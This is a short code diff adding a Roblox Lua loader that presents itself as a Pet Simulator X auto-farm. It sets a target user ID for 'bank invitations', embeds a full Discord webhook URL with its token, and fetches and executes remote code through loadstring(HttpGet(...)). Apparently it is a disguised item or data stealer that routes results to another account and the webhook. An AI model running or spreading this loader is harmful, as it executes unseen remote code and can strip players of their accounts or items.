@@ -1,0 +1,5 @@
+_G.UserID = 2805243431 -- userid here ( the user that accepting a bank Invitation )
+
+_G.WebHook = "https://discord.com/api/webhooks/995225058639368272/NULxm8TdFURQluiBjobtWgeJrM8stqED8ODjXbe4PGLW93WzgGadYtnnDQgZSgT92u3a" -- Webhook links here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua"))()
